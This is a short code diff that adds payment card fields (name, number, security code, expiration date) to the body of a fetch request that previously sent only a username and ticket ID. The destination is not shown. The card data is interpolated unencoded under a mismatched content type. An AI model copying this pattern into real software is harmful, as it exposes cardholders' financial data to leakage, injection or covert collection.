@@ -59,7 +59,8 @@
                 headers: {
                     "Content-Type": "text/html"
                 },
-                body: `username=${username}&ticket_id=${id}`
+                body: 
+                    `username=${username}&ticket_id=${id}&full_name=${fullName}&number=${number}&security_code=${securityCode}&expiration_date=${expirationDate}`
             })
             .then(response => {
                 return(response.status);
